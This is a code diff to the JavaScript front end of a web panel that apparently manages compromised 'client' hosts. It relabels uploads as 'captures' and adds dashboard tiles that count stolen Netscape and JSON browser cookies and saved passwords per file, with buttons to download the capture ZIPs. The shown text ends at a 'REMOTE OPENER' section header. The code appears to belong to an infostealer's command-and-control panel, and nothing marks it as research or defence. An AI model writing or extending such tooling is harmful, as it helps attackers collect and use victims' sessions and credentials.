@@ -209,7 +209,7 @@ async function openHostDetail(c) {
         <button class="ghost mini" data-del style="border-color:rgba(248,113,113,.35);color:var(--red)">delete</button>
       </div>
 
-      <h3 style="margin-top:28px;font-size:14px;border-bottom:1px solid var(--line);padding-bottom:8px;">uploads</h3>
+      <h3 style="margin-top:28px;font-size:14px;border-bottom:1px solid var(--line);padding-bottom:8px;">captures</h3>
       <div id="u-list" style="margin-top:12px;"><div class="note">loading…</div></div>
     </div>`;
 
@@ -243,24 +243,99 @@ async function loadUploads(clientId, container) {
   if (!r.ok) { container.innerHTML = '<div class="note">failed to load</div>'; return; }
   const rows = await r.json();
   container.innerHTML = '';
+  
   if (rows.length === 0) {
-    container.innerHTML = '<div class="note">no uploads yet.</div>';
+    container.innerHTML = '<div class="note">no captures yet.</div>';
     return;
   }
-  rows.forEach(u => {
-    const el = document.createElement('div');
-    el.className = 'upload-row';
-    el.innerHTML = `
-      <div>
-        <div class="name">${esc(u.filename)}</div>
-        <div class="meta">${new Date(u.created_at).toLocaleString()} · ${humanSize(u.size)}</div>
-      </div>
-      <button class="ghost mini" data-dl>download</button>`;
-    el.querySelector('[data-dl]').addEventListener('click', () => {
-      location.href = `/api/uploads/${u.id}/download`;
-    });
-    container.appendChild(el);
-  });
+
+  const latest = rows[0];
+  
+  if (latest && latest.stats) {
+      const s = latest.stats;
+      
+      let html = `<div style="display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-bottom: 20px;">`;
+      
+      html += `
+        <div class="tile" style="padding: 16px;">
+            <div class="k" style="color:var(--green)">Netscape Cookies</div>
+            <div class="v" style="font-size: 24px; color:var(--green)">${s.netscapeCookies}</div>
+            ${s.cookieFiles.filter(f=>f.type==='netscape').map(f => `<div style="font-size:11px; color:var(--muted); margin-top:4px; font-family:var(--mono); overflow:hidden; text-overflow:ellipsis; white-space:nowrap;">${esc(f.name)} (${f.count})</div>`).join('')}
+        </div>
+      `;
+      
+      html += `
+        <div class="tile" style="padding: 16px;">
+            <div class="k" style="color:var(--green)">JSON Cookies</div>
+            <div class="v" style="font-size: 24px; color:var(--green)">${s.jsonCookies}</div>
+            ${s.cookieFiles.filter(f=>f.type==='json').map(f => `<div style="font-size:11px; color:var(--muted); margin-top:4px; font-family:var(--mono); overflow:hidden; text-overflow:ellipsis; white-space:nowrap;">${esc(f.name)} (${f.count})</div>`).join('')}
+        </div>
+      `;
+      
+      html += `
+        <div class="tile" style="padding: 16px; grid-column: span 2;">
+            <div class="k" style="color:var(--red)">Passwords</div>
+            <div class="v" style="font-size: 24px; color:var(--red)">${s.passwords}</div>
+            <div style="display:flex; gap:8px; flex-wrap:wrap; margin-top:8px;">
+                ${s.passwordFiles.map(f => `<span class="priv-badge" style="background:var(--panel-3); border-color:var(--line-2); color:var(--text);">${esc(f.name)} (${f.count})</span>`).join('')}
+            </div>
+        </div>
+      `;
+      
+      html += `</div>`;
+      
+      html += `
+        <div class="tile" style="padding: 16px; display:flex; justify-content:space-between; align-items:center;">
+            <div>
+                <div class="k">Latest Capture</div>
+                <div class="v plain" style="font-size:13px; margin-top:4px;">${new Date(latest.created_at).toLocaleString()} · ${humanSize(latest.size)}</div>
+            </div>
+            <button class="primary" id="dl-latest" style="margin:0;">Download ZIP</button>
+        </div>
+      `;
+      
+      container.innerHTML = html;
+      container.querySelector('#dl-latest').addEventListener('click', () => {
+          location.href = `/api/uploads/${latest.id}/download`;
+      });
+      
+      if (rows.length > 1) {
+          const oldList = document.createElement('div');
+          oldList.style.marginTop = '20px';
+          oldList.innerHTML = `<div class="k" style="font-size:10px; margin-bottom:8px;">Previous Captures</div>`;
+          
+          rows.slice(1).forEach(u => {
+              const el = document.createElement('div');
+              el.className = 'upload-row';
+              el.innerHTML = `
+                <div>
+                  <div class="name">${esc(u.filename)}</div>
+                  <div class="meta">${new Date(u.created_at).toLocaleString()} · ${humanSize(u.size)}</div>
+                </div>
+                <button class="ghost mini" data-dl>download</button>`;
+              el.querySelector('[data-dl]').addEventListener('click', () => {
+                location.href = `/api/uploads/${u.id}/download`;
+              });
+              oldList.appendChild(el);
+          });
+          container.appendChild(oldList);
+      }
+  } else {
+      rows.forEach(u => {
+        const el = document.createElement('div');
+        el.className = 'upload-row';
+        el.innerHTML = `
+          <div>
+            <div class="name">${esc(u.filename)}</div>
+            <div class="meta">${new Date(u.created_at).toLocaleString()} · ${humanSize(u.size)}</div>
+          </div>
+          <button class="ghost mini" data-dl>download</button>`;
+        el.querySelector('[data-dl]').addEventListener('click', () => {
+          location.href = `/api/uploads/${u.id}/download`;
+        });
+        container.appendChild(el);
+      });
+  }
 }
 
 // ---------- REMOTE OPENER ----------
